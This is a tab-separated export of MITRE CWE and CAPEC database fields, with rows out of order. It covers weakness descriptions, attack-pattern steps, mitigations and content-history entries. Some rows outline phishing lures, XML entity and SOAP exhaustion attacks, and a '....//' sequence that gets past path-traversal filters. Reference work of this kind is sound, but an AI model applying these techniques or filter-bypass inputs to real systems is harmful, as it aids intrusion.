12220	73	The attacker calls signed malicious code from another language to exploit the security weaknesses in the standard libraries.
9718	28	CWE Content Team
10153	62	updated Description, Name
10022	103	Primary
18249	39	2010-06-21
21310	90	Language-Independent
24614	91	Architecture and Design
18141	35	MITRE
13338	101	CAPEC Content Team
13175	35	MITRE
24039	60	04
15947	83	v2
23900	26	Implementation
10473	39	2011-06-01
23606	72	Often the actions performed by injected control code are unlogged.
16508	62	updated Demonstrative_Examples
20519	33	Faisal Nabi
19146	81	Confidentiality
9092	39	2008-09-08
7210	95	The adversary initiates an exploratory phase to get familiar with the system.
19933	62	updated Time_of_Introduction
17179	39	2012-10-30
8571	35	MITRE
15970	81	Integrity
22769	31	1000
12855	23	The software does not properly verify the source of a message in the Windows Messaging System while running at elevated privileges, creating an alternate channel through which an attacker can directly send a message to the product.
24569	21	CWE Content Team
22669	21	CWE Content Team
15416	39	2017-11-08
14112	81	Other
14574	35	MITRE
23511	59	Updated Related_Weaknesses
22437	103	Primary
21023	39	2011-06-27
5868	92	Exploit
12140	28	CWE Content Team
21898	79	Authorization
6767	31	699
10531	56	Requires
22082	63	Hide Activities
11500	39	2012-05-11
19141	28	CWE Content Team
23598	63	Read Application Data
17985	28	CWE Content Team
10858	43	Simple
6773	35	MITRE
9521	76	2015-11-09
25288	90	Java
18664	62	updated Time_of_Introduction
21452	62	converted from Compound_Element to Weakness
15568	35	MITRE
13845	59	Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Phases, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Probing_Techniques, Related_Weaknesses, Solutions_and_Mitigations
12391	21	7 Pernicious Kingdoms
14245	39	2009-03-10
5612	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
9928	28	CWE Content Team
14362	72	The consequences will vary based on the context surrounding the incorrect precedence. In a security decision, integrity or confidentiality are the most likely results. Otherwise, a crash may occur due to the software reaching an unexpected state.
16766	104	308
11583	62	updated Relationships, Taxonomy_Mappings
11274	62	updated Common_Consequences
23463	31	1000
22583	59	Updated Attacker_Skills_or_Knowledge_Required
24608	53	The MITRE Corporation
22660	67	Medium
16434	39	2017-11-08
11900	81	Availability
16273	62	updated Applicable_Platforms, Maintenance_Notes, Relationship_Notes
7677	81	Access Control
21569	85	70
16333	26	Operation
19971	62	updated Demonstrative_Examples
20513	35	MITRE
19945	62	updated Potential_Mitigations
16285	51	2014-06-23
19733	39	2008-09-08
13741	35	MITRE
10015	62	updated Description, Other_Notes, Potential_Mitigations
5759	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
19186	31	699
23949	91	Architecture and Design
12479	21	7 Pernicious Kingdoms
24502	101	CAPEC Content Team
22111	101	CAPEC Content Team
13161	72	Anyone can read the information by gaining access to the channel being used for communication.
24540	28	CWE Content Team
6745	51	2014-06-23
8323	35	MITRE
11325	103	Primary
17920	103	Primary
23618	61	Draft
25277	101	CAPEC Content Team
12777	101	CAPEC Content Team
10954	95	[Convince user to enter sensitive information on attacker's site.] An attacker sends an e-mail to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to attacker's website) and log in. The key is to get the victim to believe that the e-mail is coming from a legitimate entity with which the victim does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.
23972	39	2010-02-16
21911	39	2008-09-08
8787	39	2008-07-01
9035	80	Ability to compromise systems containing sensitive data
23999	103	Primary
11072	28	CWE Content Team
24940	67	Medium
9633	86	https://randomascii.wordpress.com/2012/02/25/comparing-floating-point-numbers-2012-edition/
18453	45	Base
9075	88	Use of Insufficiently Random Values
5825	35	MITRE
18178	35	MITRE
22962	104	783
20540	52	This might require an understanding of intended program behavior or design to determine whether the value is incorrect.
8263	42	Subdivide and allocate resources and components so that a failure in one part does not affect the entire product.
22482	24	MITRE
11206	39	2010-02-16
12380	30	Means, Ryan L.
7510	94	A successful flooding attack compromises the availability of the target system's service by exhausting its available resources.
11792	36	http://www.owasp.org/index.php/File_System
20582	39	2008-11-24
16124	28	CWE Content Team
21053	25	Low
6475	33	Bruce Schneier
12576	101	CAPEC Content Team
17904	39	2012-10-30
16053	67	High
14243	31	1000
14651	91	Implementation
18503	81	Other
11795	33	Daniel Genkin
5625	39	2012-05-11
5616	39	2008-09-08
16119	35	MITRE
8794	39	2008-09-08
18541	28	CWE Content Team
11782	81	Availability
17569	28	CWE Content Team
5588	50	Purchase potential SoundSquatted domains and forward to legitimate domain.
22133	66	Does Java pass by reference or pass by value?
8488	77	Dynamic Analysis with Manual Results Interpretation
22627	100	The MITRE Corporation
17275	81	Accountability
18826	91	Implementation
13524	39	2010-02-16
17749	55	CAPEC Content Team
11889	45	Base
7752	24	Cigital
20593	39	2008-07-01
17397	39	2009-03-10
16743	28	CWE Content Team
24360	39	2008-11-24
20902	28	CWE Content Team
19399	39	2009-10-29
20708	28	CWE Content Team
23759	62	updated Potential_Mitigations
18632	91	Implementation
11703	26	Implementation
24304	39	2012-10-30
7591	28	CWE Content Team
18300	91	Requirements
10065	62	updated Relationships, Taxonomy_Mappings
13048	79	Availability
13334	79	Authorization
20156	96	2008-01-30
20738	23	The application generates a query intended to access or manipulate data in a data store such as a database, but it does not neutralize or incorrectly neutralizes special elements that can modify the intended logic of the query.
22952	28	CWE Content Team
10084	90	Language-Independent
21999	62	updated Detection_Factors, Relationships
7364	96	2018-07-02
21690	79	Confidentiality
22271	39	2019-01-03
8177	40	This type of an attack requires physical access to a device to either excavate the image files (potentially by leveraging a Jailbreak) or view the screenshots through the multitasking switcher (by double tapping the home button on the device).
6168	62	updated Relationships
20720	39	2010-06-21
6889	35	MITRE
13918	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer
7033	72	If a pseudo-random number generator is using a limited entropy source which runs out (if the generator fails closed), the program may pause or crash.
23697	31	1000
7668	92	Exploit
10871	81	Availability
6912	54	Low
8118	88	Synchronous Access of Remote Resource without Timeout
11126	79	Confidentiality
7017	88	Use of Hard-coded Credentials
20973	35	MITRE
16987	39	2017-11-08
9623	90	C
21002	62	updated Relationships, Taxonomy_Mappings
16066	35	MITRE
23954	74	2
13164	23	An attacker with access to data files and processes on a victim's system injects malicious data into critical operational data during configuration or recalibration, causing the victim's system to perform in a suboptimal manner that benefits the adversary.
7494	62	updated Relationships, Taxonomy_Mappings, Weakness_Ordinalities
15672	39	2014-06-23
24433	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
13710	39	2010-02-16
6902	81	Access Control
12413	79	Access Control
7993	63	Read Application Data
21666	88	Improper Neutralization of Delimiters
16569	62	updated Potential_Mitigations, Time_of_Introduction
24524	59	Updated Related_Weaknesses
5963	28	CWE Content Team
19126	66	Re: Corsaire Security Advisory - Multiple vendor MIME RFC2047 encoding
13336	43	Simple
16737	62	updated Relationships
9236	62	updated Relationships, Taxonomy_Mappings
5953	25	High
14413	100	The MITRE Corporation
25124	26	Implementation
22156	26	Implementation
5922	39	2008-09-08
14650	35	Cigital
23310	102	ChildOf
19757	39	2010-09-27
8507	39	2011-09-13
10655	96	2012-12-21
11736	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
6877	31	1003
7274	39	2008-07-01
14598	28	CWE Content Team
18633	62	updated Relationships
17155	39	2009-03-10
22009	90	Interpreted
15550	35	MITRE
9459	74	2
8470	81	Integrity
25148	35	MITRE
8911	31	1000
14107	45	Class
9362	70	Dozens of Online 'Dark Markets' Seized Pursuant to Forfeiture Complaint Filed in Manhattan Federal Court in Conjunction with the Arrest of the Operator of Silk Road 2.0
13932	62	updated Demonstrative_Examples, Relationships
23802	81	Other
14208	81	Confidentiality
12823	62	updated Background_Details, Demonstrative_Examples, Description, Relationships
6074	79	Access Control
17384	102	ChildOf
23378	33	Steve Christey
16928	35	MITRE
20298	40	The target system must expose API functionality in a manner that can be discovered and manipulated by an adversary. This may require reverse engineering the API syntax or decrypting/de-obfuscating client-server exchanges.
12256	62	updated Common_Consequences
6058	79	Confidentiality
6290	54	Low
10332	81	Availability
17719	62	updated Relationships
21461	56	ChildOf
15213	77	Dynamic Analysis with Automated Results Interpretation
8957	62	updated Applicable_Platforms, Description, Relationships, Other_Notes, Weakness_Ordinalities
22092	88	Excessive Index Range Scan for a Data Resource
23081	103	Primary
14976	91	Implementation
24526	62	updated Relationships
24561	31	1000
11919	26	Architecture and Design
10571	28	CWE Content Team
12640	28	CWE Content Team
17693	62	updated Relationships, Taxonomy_Mappings, White_Box_Definitions
20894	31	699
11618	31	1000
18565	21	PLOVER
17582	39	2011-06-27
18063	62	updated Potential_Mitigations
12172	28	CWE Content Team
8022	28	CWE Content Team
22864	81	Other
17048	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
17943	31	1000
10806	63	DoS: Crash, Exit, or Restart
11071	62	updated Relationships, Other_Notes, Taxonomy_Mappings
22044	35	MITRE
22508	47	Unreliable Execution
6947	104	777
10419	39	2017-05-03
14024	39	2011-06-01
21664	96	2013-01-26
17550	21	7 Pernicious Kingdoms
23088	94	A successful DOM-based XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.
5731	35	MITRE
24855	56	CanPrecede
19214	101	CAPEC Content Team
8162	39	2017-11-08
13749	79	Access Control
18583	24	MITRE
14705	35	MITRE
13925	103	Primary
21385	62	updated Modes_of_Introduction, Relationships, Relevant_Properties
19226	31	1003
12060	39	2011-06-01
24307	62	updated Common_Consequences
11773	28	CWE Content Team
12241	102	ChildOf
7458	62	updated Relationships
11989	35	MITRE
13448	66	Avoiding bogus encryption products: Snake Oil FAQ
6370	31	699
6966	79	Integrity
22936	39	2012-10-30
22498	62	updated Description, Relationships, Taxonomy_Mappings
11030	101	CAPEC Content Team
8231	96	2009-05-08
21343	35	MITRE
11137	100	The MITRE Corporation
16370	88	UI Discrepancy for Security Feature
13405	62	updated Name
11023	28	CWE Content Team
21508	39	2009-12-28
7964	96	2011-05-24
12762	88	Struts: Validator Turned Off
18576	35	MITRE
25246	21	Pascal Meunier
21438	42	Developers should anticipate that extra special elements will be injected in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
6755	91	Implementation
19656	28	CWE Content Team
12824	35	MITRE
12405	39	2011-06-01
13564	28	CWE Content Team
9128	28	CWE Content Team
8172	62	updated Time_of_Introduction
22174	53	The MITRE Corporation
16172	66	Windows NTFS Alternate Data Streams
10610	28	CWE Content Team
12608	62	updated Relationships
23596	35	MITRE
11314	48	07
7142	33	Information Technology Laboratory, National Institute of Standards and Technology
16642	21	PLOVER
24200	39	2008-10-14
14894	91	Implementation
21907	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
8657	28	CWE Content Team
6004	103	Primary
23265	35	MITRE
13550	89	Detailed
14385	50	Ensure rigorous physical defensive measures to keep the adversary from accessing critical systems..
19803	35	MITRE
14978	56	ChildOf
22331	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.                   Authorization weaknesses may arise when a single-user application is ported to a multi-user environment.
17324	39	2018-03-27
22699	28	CWE Content Team
22196	86	http://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478
9113	39	2017-11-08
19115	76	2018-07-31
18947	103	Primary
14888	69	Draft
8155	28	CWE Content Team
19835	62	updated Relationships
21314	35	MITRE
12641	39	2012-05-11
19445	62	updated Relationships
12253	103	Primary
15601	28	CWE Content Team
25087	48	03
15889	62	updated Potential_Mitigations
21900	39	2011-06-27
12433	35	MITRE
21819	44	High
13386	28	CWE Content Team
9520	35	MITRE
6142	31	1000
23791	76	2019-04-04
22230	91	Implementation
20194	72	If the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the wrap around results in other conditions such as buffer overflows, further memory corruption may occur.
12067	35	MITRE
24463	93	Defense in Depth
20374	62	updated Potential_Mitigations
24997	56	ChildOf
21031	96	2009-06-30
12003	91	Testing
14354	28	CWE Content Team
14037	28	CWE Content Team
21655	70	Supply Chain Risk Management (SCRM)
10891	23	A constant symbolic reference to an object is used, even though the reference can resolve to a different object over time.
9961	42	Common protection mechanisms include:                                                                  Disconnecting the user after a small number of failed attempts                         Implementing a timeout                         Locking out a targeted account                         Requiring a computational task on the user's part.
17005	39	2008-09-08
22117	28	CWE Content Team
20819	80	The adversary requires privileged credentials or the development/acquiring of a tailored remote access tool.
20235	62	updated Relationships, Taxonomy_Mappings
20686	28	CWE Content Team
21722	81	Confidentiality
11187	97	Filter Failure through Buffer Overflow
9632	39	2017-11-08
17420	55	CAPEC Content Team
6137	36	http://phrack.org/issues/56/7.html
7084	53	The MITRE Corporation
19973	35	MITRE
5742	62	updated Relationships
6814	35	MITRE
19505	56	ChildOf
14592	31	699
20757	28	CWE Content Team
19817	35	MITRE
23110	28	CWE Content Team
8656	91	Implementation
22260	33	Microsoft
14844	91	Implementation
11482	72	In some cases it may be possible to delete files that a malicious user might not otherwise have access to -- such as log files.
16858	26	Implementation
17439	62	updated Applicable_Platforms, Relationships
18191	30	Michal Zalewski
17619	47	Execute Unauthorized Commands
13546	63	Read Files or Directories
13972	28	Eric Dalci
19091	39	2011-03-29
9508	43	Simple
20103	79	Availability
12264	39	2014-07-30
15265	62	updated Common_Consequences, Description, Maintenance_Notes, Name, Relationships
22747	23	An attacker harvests identifying information about a victim via an active session that the victim's browser has with a social networking site. A victim may have the social networking site open in one tab or perhaps is simply using the "remember me" feature to keep his or her session with the social networking site active. An attacker induces a payload to execute in the victim's browser that transparently to the victim initiates a request to the social networking site (e.g., via available social network site APIs) to retrieve identifying information about a victim. While some of this information may be public, the attacker is able to harvest this information in context and may use it for further attacks on the user (e.g., spear phishing). In one example of an attack, an attacker may post a malicious posting that contains an image with an embedded link. The link actually requests identifying information from the social networking site. A victim who views the malicious posting in his or her browser will have sent identifying information to the attacker, as long as the victim had an active session with the social networking site. There are many other ways in which the attacker may get the payload to execute in the victim's browser mainly by finding a way to hide it in some reputable site that the victim visits. The attacker could also send the link to the victim in an e-mail and trick the victim into clicking on the link. This attack is basically a cross site request forgery attack with two main differences. First, there is no action that is performed on behalf of the user aside from harvesting information. So standard CSRF protection may not work in this situation. Second, what is important in this attack pattern is the nature of the data being harvested, which is identifying information that can be obtained and used in context. This real time harvesting of identifying information can be used as a prelude for launching real time targeted social engineering attacks on the victim.
9627	26	Implementation
13316	62	updated Common_Consequences, Demonstrative_Examples, Relationships
14665	28	CWE Content Team
24651	33	Suman Jana
17279	44	Moderate
23087	35	MITRE
23560	33	John Burgess
21181	40	The application server does incomplete input data decoding, filtering and validation.
10062	79	Integrity
6687	42	Developers should anticipate that leading special elements will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
8859	63	Bypass Protection Mechanism
21259	90	Language-Independent
5897	91	Architecture and Design
18422	43	Simple
16407	81	Confidentiality
8593	26	Architecture and Design
15322	32	OWASP
6558	75	This is not a perfect solution, since 100% accuracy and coverage are not feasible.
22130	28	Eric Dalci
20882	88	Authorization Bypass Through User-Controlled SQL Primary Key
20446	35	MITRE
10635	39	2011-09-13
7553	35	MITRE
21037	45	Base
11897	61	Draft
15091	100	The MITRE Corporation
5936	97	Catching exception throw/signal from privileged block
6123	104	96
10656	62	updated Potential_Mitigations
21019	97	Evil Twin Wi-Fi Attack
11523	62	updated Description, Relationships
20753	30	Manic Velocity
7536	62	updated Relationships, Taxonomy_Mappings
7234	102	CanPrecede
16014	91	Architecture and Design
15434	62	updated Common_Consequences
19860	90	C++
20467	39	2008-10-14
23028	62	updated Other_Notes
17584	35	MITRE
6374	62	updated Relationships, Other_Notes
8812	39	2008-09-08
14517	63	Bypass Protection Mechanism
21254	35	MITRE
6608	54	Low
18065	35	MITRE
24756	39	2011-03-29
7836	62	updated Demonstrative_Examples
18068	28	CWE Content Team
10556	78	Low
16860	62	updated Relationships
22391	31	1000
22746	35	MITRE
24567	101	CAPEC Content Team
9641	28	CWE Content Team
10430	62	updated Background_Details, Description, Relationships
24742	79	Confidentiality
21339	62	updated References, Relationships
19897	31	1000
8875	35	MITRE
12157	35	MITRE
9623	43	Simple
20381	40	The target system uses a mail server.
11983	28	CWE Content Team
20297	39	2008-09-08
8224	72	If the code is ported to another platform or environment, the pointer is likely to be invalid and cause a crash.
13580	62	updated Background_Details, Common_Consequences, Other_Notes
22595	28	CWE Content Team
9594	81	Other
17519	63	Reduce Reliability
18760	62	updated Potential_Mitigations
15869	39	2011-06-01
13949	39	2008-10-14
7506	39	2008-07-01
5644	42	Use a language that provides abstractions for memory allocation and deallocation.
11529	62	updated Relationships
18339	69	Draft
20706	91	Implementation
5936	27	None: No specialized resources are required to execute this type of attack. The attacker needs to be able to latch onto a privileged thread.                The Attacker does, however, need to be able to program, compile, and link to the victim binaries being executed so that it will turn control of a privileged thread over to the Attacker's malicious code. This is the case even if the attacker conducts the attack remotely.
6308	62	updated Demonstrative_Examples
21562	49	2005
17921	25	Low
13187	35	MITRE
11491	28	CWE Content Team
23497	62	updated Relationships
19464	50	Ensure that production systems to not contain sample or test APIs and that these APIs are only used in development environments.
16973	85	307
21849	39	2010-12-13
20637	28	CWE Content Team
16471	91	Architecture and Design
10085	88	Path Equivalence: ' filename' (Leading Space)
7704	28	CWE Content Team
10259	28	Eric Dalci
24620	35	MITRE
22334	23	An adversary may execute an attack on a web service that uses SOAP messages in communication. By sending a very large SOAP array declaration to the web service, the attacker forces the web service to allocate space for the array elements before they are parsed by the XML parser. The attacker message is typically small in size containing a large array declaration of say 1,000,000 elements and a couple of array elements. This attack targets exhaustion of the memory resources of the web service.
8213	31	1000
5610	70	Intrusion Resistant SOAP Messaging with IAPF
8832	35	MITRE
16683	36	https://www.owasp.org/index.php/Log_Injection
9172	35	Cigital
22151	90	C++
6165	23	A possible shell file exists in /cgi-bin/ or other accessible directories. This is extremely dangerous and can be used by an attacker to execute commands on the web server.
15035	62	updated Relationships
15459	79	Access Control
21466	42	For front-end to back-end connections: Three solutions are possible, although none are complete.                                                                  The first suggestion involves the use of generated passwords or keys that are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals.                         Next, the passwords or keys should be limited at the back end to only performing actions valid for the front end, as opposed to having full access.                         Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay-style attacks.
11055	50	If possible, leverage coding language(s) that do not allow this weakness to occur (e.g., Java, Ruby, and Python all perform automatic garbage collection that releases memory for objects that have been deallocated).
25295	42	Protect information stored in cache.
11994	28	CWE Content Team
9606	56	ChildOf
20525	86	https://ibreak.software/cross-site-port-attacks-xspa-part-1/
10649	63	Gain Privileges or Assume Identity
24437	81	Availability
15430	62	updated Potential_Mitigations, References
23123	59	Updated Related_Attack_Patterns
13743	42	Let the initiator prove its identity before proceeding.
9686	45	Base
7235	28	CWE Content Team
11662	46	An example of this problem would be if paired characters appear in the wrong order, or if the special characters are not properly nested.
11285	94	Information Leakage
11129	62	updated Relationships
14562	102	ChildOf
10892	39	2019-01-03
12387	35	MITRE
6937	62	updated Common_Consequences
19601	28	CWE Content Team
23239	50	Shut down unnecessary services/ports.
10628	62	updated Description, Modes_of_Introduction, Other_Notes, Time_of_Introduction
11788	62	updated Potential_Mitigations
16842	52	Certain automated dynamic analysis techniques may be effective in spotting resource exhaustion problems, especially with resources such as processes, memory, and connections. The technique may involve generating a large number of requests to the software within a short time frame.
14241	101	CAPEC Content Team
7475	85	47
9153	63	Read Files or Directories
22365	28	CWE Content Team
14732	31	699
8741	42	Check that critical variables are initialized.
12781	28	Eric Dalci
23957	104	910
22395	62	updated Potential_Mitigations
16422	89	Meta
17525	74	2
22453	43	Simple
9792	53	The MITRE Corporation
16500	28	CWE Content Team
16070	35	MITRE
15406	35	MITRE
14073	62	updated Time_of_Introduction
24748	62	updated Relationships
9059	69	Incomplete
20762	26	Implementation
18659	42	Developers should anticipate that comments will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
14380	31	1000
12300	24	MITRE
8218	88	Use of Uninitialized Resource
19630	103	Primary
23910	35	MITRE
12817	59	Updated Related_Attack_Patterns
17402	35	Cigital
13494	35	MITRE
13973	35	MITRE
22472	43	Simple
24947	95	[Launch an XML Entity Linking attack] The attacker crafts malicious XML message that contains references to senstive files.
14529	26	Architecture and Design
17540	91	Operation
8174	62	updated Description, Name
18713	43	Simple
18500	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
8117	39	2009-03-10
10464	62	updated Relationships, Other_Notes, Taxonomy_Mappings
8162	62	updated Causal_Nature, Demonstrative_Examples, Detection_Factors, Potential_Mitigations, Relationships
12797	35	MITRE
21235	35	MITRE
18520	44	High
6222	31	1003
8655	43	Simple
9349	23	An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes any stack traces produced by error messages. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to cause the targeted application to return an error including a stack trace, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. The stack trace enumerates the chain of methods that led up to the point where the error was encountered. This can not only reveal the names of the methods (some of which may have known weaknesses) but possibly also the location of class files and libraries as well as parameter values. In some cases, the stack trace might even disclose sensitive configuration or user information.
8068	35	MITRE
11996	23	The user interface (UI) does not properly represent critical information to the user, allowing the information - or its source - to be obscured or spoofed. This is often a component in phishing attacks.
24246	101	CAPEC Content Team
11422	39	2009-07-27
11794	39	2009-03-10
16441	62	updated Potential_Mitigations
16757	42	Understand the programming language's underlying representation and how it interacts with numeric calculation (CWE-681). Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, "not-a-number" calculations, and how the language handles numbers that are too large or too small for its underlying representation. [REF-7]                   Also be careful to account for 32-bit, 64-bit, and other potential differences that may affect the numeric representation.
15248	43	Simple
20089	88	Duplicate Operations on Resource
19554	103	Primary
23021	45	Class
7053	46	IP addresses can be easily spoofed. Attackers can forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication.
22031	79	Availability
18359	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
14925	35	MITRE
23966	89	Detailed
7500	35	MITRE
17935	39	2010-12-13
10350	62	updated Demonstrative_Examples, Taxonomy_Mappings, White_Box_Definitions
19534	35	MITRE
19378	31	1000
24268	62	updated Potential_Mitigations
8482	57	Indirect
18804	44	High
10856	39	2011-06-01
12508	79	Confidentiality
6717	28	CWE Content Team
18468	62	updated References, Related_Attack_Patterns, Relationships, Weakness_Ordinalities
15042	89	Detailed
7529	101	CAPEC Content Team
20506	42	Verify the integrity of the software that is being installed.
24658	100	The MITRE Corporation
25348	35	Cigital
5856	26	Architecture and Design
24175	62	updated References
6562	100	The MITRE Corporation
19794	81	Availability
18682	62	updated Likelihood_of_Exploit
9587	39	2017-11-08
22705	26	Implementation
9807	28	CWE Content Team
25131	35	MITRE
11217	73	Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.
15698	76	2017-08-04
23936	63	Bypass Protection Mechanism
16126	26	Implementation
10386	28	CWE Content Team
15914	42	Store state information on the server side only. Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.
20744	35	MITRE
23896	31	1000
6144	45	Class
6566	35	MITRE
19622	24	MITRE
9939	28	Eric Dalci
13450	103	Primary
23273	35	MITRE
13840	35	MITRE
20997	90	C++
21869	62	updated Relationships
11314	86	https://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf
7401	78	Low
22007	86	http://www.infosecwriters.com/texts.php?op=display&id=159
18980	28	CWE Content Team
9566	91	Architecture and Design
9511	25	High
18424	21	PLOVER
16530	24	MITRE
25303	62	updated Detection_Factors, Potential_Mitigations, References, Taxonomy_Mappings
16251	54	Low
17239	39	2008-09-08
5637	25	Low
10623	28	CWE Content Team
13349	69	Incomplete
21678	42	When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.
17321	78	Medium
19739	81	Integrity
17100	97	Phishing
10426	28	CWE Content Team
13349	46	This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.             The '....//' manipulation is useful for bypassing some path traversal protection schemes. If "../" is filtered in a sequential fashion, as done by some regular expression engines, then "....//" can collapse into the "../" unsafe value (CWE-182). It could also be useful when ".." is removed, if the operating system treats "//" and "/" as equivalent.
6611	35	MITRE
23741	32	The Open Web Application Security Project (OWASP)
23551	28	CWE Content Team
9857	103	Primary
17599	63	Reduce Performance
20668	63	Read Application Data
19288	43	Simple
17197	91	Implementation
8375	35	MITRE
14557	40	The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.
24903	28	CWE Content Team
24095	62	updated Potential_Mitigations
12787	39	2009-12-28
23613	76	2017-08-04
11214	104	413
8764	53	The MITRE Corporation
15485	92	Explore
16269	39	2014-07-30
22523	35	MITRE
15783	103	Primary
20594	103	Primary
11858	23	The product's architecture, source code, design, documentation,      or other artifact does not follow required conventions.
20581	62	updated Common_Consequences
17508	94	Disabling a network route at the routing infrastructure level denies availability of that route.
18567	35	MITRE
13998	23	The J2EE application directly uses sockets instead of using framework method calls.
21473	30	Samy Kamkar
17318	66	Analyzing the Crossdomain Policies of Flash Applications
17559	101	CAPEC Content Team
19768	28	CWE Content Team
6747	56	ChildOf
10820	81	Confidentiality
24798	69	Incomplete
12627	51	2014-06-23
24533	72	Accessing a file descriptor that has been closed can cause a crash.
11348	89	Detailed
12957	35	MITRE
7004	39	2019-01-03
24811	28	CWE Content Team
20943	85	332
18588	90	Java
7824	39	2017-11-08
9414	36	http://www.owasp.org/index.php/Testing_for_Web_Application_Fingerprint_%28OWASP-IG-004%29
13252	39	2014-07-30
8041	103	Primary
12879	101	CAPEC Content Team
9180	101	CAPEC Content Team
23351	89	Meta
6489	100	The MITRE Corporation
14500	39	2009-05-27
16631	62	updated Potential_Mitigations, References, Relationships
9807	39	2012-05-11
8463	35	MITRE
6212	93	Moderate
24527	39	2008-10-14
11113	31	1000
19312	95	[Execute malicious HTTP Trace launching script] The adversary leverages a vulnerability to force the victim to execute the malicious HTTP Trace launching script
